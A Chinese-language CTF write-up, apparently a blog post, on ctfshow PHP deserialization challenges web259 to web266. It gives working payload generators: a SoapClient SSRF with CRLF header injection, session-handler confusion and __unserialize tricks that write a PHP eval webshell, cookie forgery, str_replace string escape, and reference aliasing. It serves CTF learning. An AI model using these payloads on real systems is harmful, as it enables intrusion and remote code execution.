<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$xff</span> = explode(<span class="string">&#x27;,&#x27;</span>, <span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>]);</span><br><span class="line">array_pop(<span class="variable">$xff</span>);</span><br><span class="line"><span class="variable">$ip</span> = array_pop(<span class="variable">$xff</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$ip</span>!==<span class="string">&#x27;127.0.0.1&#x27;</span>)&#123;</span><br><span class="line">	<span class="keyword">die</span>(<span class="string">&#x27;error&#x27;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">	<span class="variable">$token</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;token&#x27;</span>];</span><br><span class="line">	<span class="keyword">if</span>(<span class="variable">$token</span>==<span class="string">&#x27;ctfshow&#x27;</span>)&#123;</span><br><span class="line">		file_put_contents(<span class="string">&#x27;flag.txt&#x27;</span>,<span class="variable">$flag</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>反手打一个<code>xff</code>进去，但是并没有什么效果，看来它会检查真实<code>ip</code>。于是我们只能尝试看看有没有<code>SSRF</code>漏洞了。</p>
<p>这里引入一个PHP原生类<code>SoapClient</code>，这个类的<code>__call()</code>方法会发起一个<code>post</code>请求，于是我们构造这样一个反序列化序列。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//我们需要注意的是，我们这里其实是利用User-Agent头的信息，覆盖后续的HTTP报文头信息（\r\n不能少），由于存在Code-Length这一项，我们post之后的内容会被丢弃。</span></span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">    <span class="variable">$post_string</span> = <span class="string">&#x27;token=ctfshow&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$soap</span> = <span class="keyword">new</span> SoapClient(</span><br><span class="line">        <span class="literal">null</span>, </span><br><span class="line">        <span class="keyword">array</span>(</span><br><span class="line">            <span class="string">&#x27;uri&#x27;</span>=&gt; <span class="string">&quot;http://127.0.0.1/flag.php&quot;</span>,</span><br><span class="line">            <span class="string">&#x27;location&#x27;</span> =&gt; <span class="string">&#x27;http://127.0.0.1/flag.php&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;user_agent&#x27;</span>=&gt;<span class="string">&quot;edge\r\nX-Forwarded-For:127.0.0.1,127.0.0.1\r\nContent-Type: application/x-www-form-urlencoded&quot;</span>.<span class="string">&quot;\r\nContent-Length: &quot;</span>.(<span class="keyword">string</span>)strlen(<span class="variable">$post_string</span>).<span class="string">&quot;\r\n\r\n&quot;</span>.<span class="variable">$post_string</span>,</span><br><span class="line">        )</span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    <span class="keyword">echo</span>(urlencode(serialize(<span class="variable">$soap</span>)));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>打进去之后，就解决了这些问题。</p>
<h3 id="web260"><a href="#web260" class="headerlink" title="web260"></a>web260</h3><p>简单正则匹配，没看懂在干什么。</p>
<h3 id="web261（-unserialize-魔术方法）"><a href="#web261（-unserialize-魔术方法）" class="headerlink" title="web261（__unserialize() 魔术方法）"></a>web261（__unserialize() 魔术方法）</h3><p>这也是一个PHP版本问题的点</p>
<p>官方链接附上：</p>
<p><a href="https://www.php.net/manual/en/language.oop5.magic.php#object.unserialize">https://www.php.net/manual/en/language.oop5.magic.php#object.unserialize</a></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfshowvip</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$code</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$u</span>,<span class="variable">$p</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;username=<span class="variable">$u</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;password=<span class="variable">$p</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;username!=<span class="string">&#x27;&#x27;</span> || <span class="keyword">$this</span>-&gt;password!=<span class="string">&#x27;&#x27;</span>)&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;error&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__unserialize</span>(<span class="params"><span class="variable">$data</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;username=<span class="variable">$data</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">        <span class="keyword">$this</span>-&gt;password=<span class="variable">$data</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line">        <span class="keyword">$this</span>-&gt;code = <span class="keyword">$this</span>-&gt;username.<span class="keyword">$this</span>-&gt;password;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;code==<span class="number">0x36d</span>)&#123;</span><br><span class="line">            file_put_contents(<span class="keyword">$this</span>-&gt;username, <span class="keyword">$this</span>-&gt;password);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">unserialize(<span class="variable">$_GET</span>[<span class="string">&#x27;vip&#x27;</span>]);</span><br></pre></td></tr></table></figure>
<p>当<code>__wakeup()</code>和<code>__unserialize()</code>同时出现时，前者会被覆盖。</p>
<p>那 <code>__unserialize()</code>的参数是哪里来的呢，其实是<code>unserialize()</code>先解析好了，再传参数给<code>__unserialize()</code>，所以这个<code>data</code>参数本身不影响。</p>
<p>再接下来的就是常规套路了，<code>php</code>数字比较这种东西没什么好说的了</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$var</span> = <span class="keyword">new</span> ctfshowvip(<span class="string">&#x27;877.php&#x27;</span>,<span class="string">&#x27;&lt;?php eval($_POST[1]);?&gt;&#x27;</span>);</span><br><span class="line"><span class="variable">$wish</span> = serialize(<span class="variable">$var</span>);</span><br><span class="line"><span class="keyword">echo</span> urlencode(<span class="variable">$wish</span>);</span><br></pre></td></tr></table></figure>
<h3 id="wen262"><a href="#wen262" class="headerlink" title="wen262"></a>wen262</h3><p>伪造<code>cookie</code>，本身没有什么难度，生成脚本如下</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">message</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$from</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$msg</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$to</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$token</span>=<span class="string">&#x27;admin&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$f</span>,<span class="variable">$m</span>,<span class="variable">$t</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;from = <span class="variable">$f</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;msg = <span class="variable">$m</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;to = <span class="variable">$t</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$f</span> = <span class="string">&quot;a&quot;</span>;</span><br><span class="line"><span class="variable">$m</span> = <span class="string">&quot;b&quot;</span>;</span><br><span class="line"><span class="variable">$t</span> = <span class="string">&quot;c&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// if(isset($f) &amp;&amp; isset($m) &amp;&amp; isset($t))&#123;</span></span><br><span class="line"><span class="comment">//     $msg = new message($f,$m,$t);</span></span><br><span class="line"><span class="comment">//     $umsg = str_replace(&#x27;fuck&#x27;, &#x27;loveU&#x27;, serialize($msg));</span></span><br><span class="line"><span class="comment">//     setcookie(&#x27;msg&#x27;,base64_encode($umsg));</span></span><br><span class="line"><span class="comment">//     echo &#x27;Your message has been sent&#x27;;</span></span><br><span class="line"><span class="comment">// &#125;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;msg&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$msg</span> = unserialize(base64_decode(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;msg&#x27;</span>]));</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$msg</span>-&gt;token==<span class="string">&#x27;admin&#x27;</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;win&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="web263（session-反序列化）"><a href="#web263（session-反序列化）" class="headerlink" title="web263（session 反序列化）"></a>web263（session 反序列化）</h3><p>这道题有以下几个关键知识点。</p>
<ol>
<li>当 PHP 停止的时候，它会自动读取 <code>$_SESSION</code> 中的内容，并将其进行<code>序列化</code>， 然后发送给会话保存管理器来进行保存</li>
<li>不同PHP的session反序列化处理器的处理机制不同。</li>
<li><code>php</code>处理器将会在键名和键值间加上一条’|’，但是<code>php_serialize</code>则不同。</li>
</ol>
<p>解题的思路在于：在申请<code>index.php</code>页面时，我们将类似<code>php_serialize</code>处理器的机制写入，在申请<code>check.php</code>，我们成功调用了<code>php</code>处理器实现反序列化，把一句话木马写进了<code>log-1.php</code>。</p>
<p>payload.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span> = <span class="string">&quot;1.php&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span> = <span class="string">&#x27;&lt;?php eval($_POST[1]); highlight_file(__FILE__);?&gt;&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$status</span>;</span><br><span class="line">    <span class="comment">// function __destruct()&#123;</span></span><br><span class="line">    <span class="comment">//     file_put_contents(&quot;log-&quot;.$this-&gt;username, &quot;使用&quot;.$this-&gt;password.&quot;登陆&quot;.($this-&gt;status?&quot;成功&quot;:&quot;失败&quot;).&quot;----&quot;.date_create()-&gt;format(&#x27;Y-m-d H:i:s&#x27;));</span></span><br><span class="line">    <span class="comment">// &#125;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$var</span> = <span class="keyword">new</span> User();</span><br><span class="line"><span class="keyword">echo</span> base64_encode(<span class="string">&quot;|&quot;</span>.serialize(<span class="variable">$var</span>));</span><br></pre></td></tr></table></figure>
<p>我们做一个简单的实验验证一下我们的思路</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//index.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    error_reporting(<span class="number">0</span>);</span><br><span class="line">    ini_set(<span class="string">&#x27;session.serialize_handler&#x27;</span>,<span class="string">&#x27;php_serialize&#x27;</span>);</span><br><span class="line">    session_start();</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;limit&#x27;</span>]))</span><br><span class="line">    &#123;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$_SESSION</span>[<span class="string">&#x27;limit&#x27;</span>] = base64_decode(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;limit&#x27;</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Please give a cookie!&quot;</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>在浏览器页面发送请求，我们再检查本地的session文件。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">a:<span class="number">1</span>:&#123;s:<span class="number">5</span>:<span class="string">&quot;limit&quot;</span>;s:<span class="number">131</span>:<span class="string">&quot;|O:4:&quot;</span>User<span class="string">&quot;:3:&#123;s:8:&quot;</span>username<span class="string">&quot;;s:5:&quot;</span><span class="number">1</span>.php<span class="string">&quot;;s:8:&quot;</span>password<span class="string">&quot;;s:50:&quot;</span><span class="meta">&lt;?php</span> <span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="number">1</span>]); highlight_file(<span class="keyword">__FILE__</span>);<span class="meta">?&gt;</span><span class="string">&quot;;s:6:&quot;</span>status<span class="string">&quot;;N;&#125;&quot;</span>;&#125;</span><br></pre></td></tr></table></figure>
<p>在<code>php_serialize</code>模式下，我们的<code>payload</code>被当成字符串写入，接着我们换成<code>php</code>处理器读取，看看会有什么效果。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//flag.php</span></span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">   error_reporting(<span class="number">0</span>);</span><br><span class="line">   <span class="class"><span class="keyword">class</span> <span class="title">User</span></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$username</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$password</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$status</span>;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$username</span>,<span class="variable">$password</span></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;username = <span class="variable">$username</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;password = <span class="variable">$password</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">setStatus</span>(<span class="params"><span class="variable">$s</span></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;status=<span class="variable">$s</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;username;</span><br><span class="line">            <span class="comment">//file_put_contents(&quot;log-&quot;.$this-&gt;username, &quot;使用&quot;.$this-&gt;password.&quot;登陆&quot;.($this-&gt;status?&quot;成功&quot;:&quot;失败&quot;).&quot;----&quot;.date_create()-&gt;format(&#x27;Y-m-d H:i:s&#x27;));</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    ini_set(<span class="string">&#x27;session.serialize_handler&#x27;</span>, <span class="string">&#x27;php&#x27;</span>);</span><br><span class="line">    session_start();</span><br><span class="line">    <span class="comment">//var_dump($_SESSION);</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>output:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span>.php</span><br></pre></td></tr></table></figure>
<p>显然，我们此时的<code>session</code>被重新解读，原来作为字符串内容的’|’此时成了分割符，字符串后续的内容被反序列化。</p>
<p>回到题目本身，我们的思路就是：</p>
<ol>
<li>在<code>php_serialize</code>模式下，将<code>&#39;|&#39;.&quot;serialize($var)&quot;</code>的内容写入<code>SESSION</code></li>
<li>在<code>php</code>模式下发送请求，从而使得反序列化漏洞产生</li>
</ol>
<h3 id="web264（str-replace覆盖逃逸）"><a href="#web264（str-replace覆盖逃逸）" class="headerlink" title="web264（str_replace覆盖逃逸）"></a>web264（str_replace覆盖逃逸）</h3><p>这题比较有意思。虽然不大能get到实际场景中可能出现的情况，但是在其他的类型的漏洞攻击里能够借鉴这样的思路。</p>
<p>先看看漏洞的代码，这里选了部分，后续就是常见的<code>session</code>反序列化漏洞，访问一个开了<code>session</code>的<code>php</code>资源，然后验证<code>token</code>，获取反序列化的结果：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">session_start();</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">message</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$from</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$msg</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$to</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$token</span>=<span class="string">&#x27;user&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$f</span>,<span class="variable">$m</span>,<span class="variable">$t</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;from = <span class="variable">$f</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;msg = <span class="variable">$m</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;to = <span class="variable">$t</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$f</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;f&#x27;</span>];</span><br><span class="line"><span class="variable">$m</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;m&#x27;</span>];</span><br><span class="line"><span class="variable">$t</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;t&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$f</span>) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$m</span>) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$t</span>))&#123;</span><br><span class="line">    <span class="variable">$msg</span> = <span class="keyword">new</span> message(<span class="variable">$f</span>,<span class="variable">$m</span>,<span class="variable">$t</span>);</span><br><span class="line">    <span class="variable">$umsg</span> = str_replace(<span class="string">&#x27;fuck&#x27;</span>, <span class="string">&#x27;loveU&#x27;</span>, serialize(<span class="variable">$msg</span>));</span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&#x27;msg&#x27;</span>]=base64_encode(<span class="variable">$umsg</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;Your message has been sent&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure>
<p>这里主要的点就是，要如何把<code>admin</code>写入函数中，这里我们注意到有一个可以利用的攻击点就是<code>str_replace</code>，这里我们看到<code>fuck</code>被<code>loveU</code>替换。看下面几个例子。</p>
<p>O:7:”message”:4:{s:4:”from”;s:1:”1”;s:3:”msg”;s:1:”1”;s:2:”to”;s:5:<strong>“fuck””</strong>;s:5:”token”;s:4:”user”;}<br>O:7:”message”:4:{s:4:”from”;s:1:”1”;s:3:”msg”;s:1:”1”;s:2:”to”;s:5:<strong>“loveU””</strong>;s:5:”token”;s:4:”user”;}</p>
<p>O:7:”message”:4:{s:4:”from”;s:1:”1”;s:3:”msg”;s:1:”1”;s:2:”to”;s:10:<strong>“fuckfuck”1”</strong>;s:5:”token”;s:4:”user”;}<br>O:7:”message”:4:{s:4:”from”;s:1:”1”;s:3:”msg”;s:1:”1”;s:2:”to”;s:10:<strong>“loveUloveU”1”</strong>;s:5:”token”;s:4:”user”;}</p>
<p>显然我们可以注意到，如果我们在原句子中使用<code>&quot;</code>，那么和<code>loveU</code>拼接之后，后面的字符串就可以逃逸。由于<code>loveU</code>的长度比<code>fuck</code>多1，我们就多出了可以利用的空间，同时确保反序列化时的字符串对应长度不会出错。</p>
<p>我们是要在后面逃逸出这样的字符串</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">;s:<span class="number">5</span>:<span class="string">&quot;token&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;admin&quot;</span>;&#125;<span class="string">&quot;</span></span><br></pre></td></tr></table></figure>
<p>于是我们根据该字符串的长度，构造如下样例:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>    </span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">message</span></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$from</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$msg</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$to</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$token</span>=<span class="string">&#x27;user&#x27;</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$f</span>,<span class="variable">$m</span>,<span class="variable">$t</span></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;from = <span class="variable">$f</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;msg = <span class="variable">$m</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;to = <span class="variable">$t</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="variable">$f</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;f&#x27;</span>];</span><br><span class="line">    <span class="variable">$m</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;m&#x27;</span>];</span><br><span class="line">    <span class="variable">$t</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;t&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="variable">$var</span> = <span class="keyword">new</span> message(<span class="string">&quot;1&quot;</span>,<span class="string">&quot;1&quot;</span>, <span class="string">&quot;fuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuck\&quot;;s:5:\&quot;token\&quot;;s:5:\&quot;admin\&quot;;&#125;&quot;</span>);</span><br><span class="line">   </span><br><span class="line">    <span class="variable">$msg</span> = serialize(<span class="variable">$var</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$msg</span>.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$umsg</span> = str_replace(<span class="string">&#x27;fuck&#x27;</span>, <span class="string">&#x27;loveU&#x27;</span>, <span class="variable">$msg</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$umsg</span>.<span class="string">&quot;\n&quot;</span>;</span><br></pre></td></tr></table></figure>
<p>这样我们被替换之后构造的反序列字符串如下：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">O:<span class="number">7</span>:<span class="string">&quot;message&quot;</span>:<span class="number">4</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;from&quot;</span>;s:<span class="number">1</span>:<span class="string">&quot;1&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;msg&quot;</span>;s:<span class="number">1</span>:<span class="string">&quot;1&quot;</span>;s:<span class="number">2</span>:<span class="string">&quot;to&quot;</span>;s:<span class="number">135</span>:<span class="string">&quot;loveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveU&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;token&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;admin&quot;</span>;&#125;<span class="string">&quot;;s:5:&quot;</span>token<span class="string">&quot;;s:4:&quot;</span>user<span class="string">&quot;;&#125;</span></span><br></pre></td></tr></table></figure>
<p>写入<code>sess_xxxxxx</code>文件后，重新读取反序列化时，后面被闭合的部分不会再次被读取，也就成功实现了字符逃逸的过程。</p>
<h3 id="web265（变量引用）"><a href="#web265（变量引用）" class="headerlink" title="web265（变量引用）"></a>web265（变量引用）</h3><p>先上漏洞成因代码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfshowAdmin</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$token</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$t</span>,<span class="variable">$p</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;token=<span class="variable">$t</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;password = <span class="variable">$p</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">login</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;token===<span class="keyword">$this</span>-&gt;password;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$ctfshow</span> = unserialize(<span class="variable">$_GET</span>[<span class="string">&#x27;ctfshow&#x27;</span>]);</span><br><span class="line"><span class="variable">$ctfshow</span>-&gt;token=md5(mt_rand());</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$ctfshow</span>-&gt;login())&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这道题的关键在于使得两个变量强相等，这也就意味着暴力碰撞<code>0e</code>的可能性就降低了，这里我们直接构造两个变量的引用关系，解决问题。</p>
<p>payload:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">ctfshowAdmin</span></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$token</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$password</span>;</span><br><span class="line">    </span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$t</span>,<span class="variable">$p</span></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;token=<span class="variable">$t</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;password = <span class="variable">$p</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">login</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;token===<span class="keyword">$this</span>-&gt;password;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$var</span> = <span class="keyword">new</span> ctfshowAdmin(<span class="string">&quot;123&quot;</span>,<span class="string">&quot;123&quot;</span>);</span><br><span class="line">    <span class="variable">$var</span>-&gt;token = &amp;<span class="variable">$var</span>-&gt;password;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$msg</span> = serialize(<span class="variable">$var</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$msg</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="variable">$ctfshow</span> = unserialize(<span class="variable">$msg</span>);</span><br><span class="line">    <span class="variable">$ctfshow</span>-&gt;token=md5(mt_rand());</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$ctfshow</span>-&gt;login())&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;win!&quot;</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<h3 id="web266（PHP类和方法大小写绕过）"><a href="#web266（PHP类和方法大小写绕过）" class="headerlink" title="web266（PHP类和方法大小写绕过）"></a>web266（PHP类和方法大小写绕过）</h3><p>这道题的点主要在于PHP类和方法不区分大小写绕过。</p>
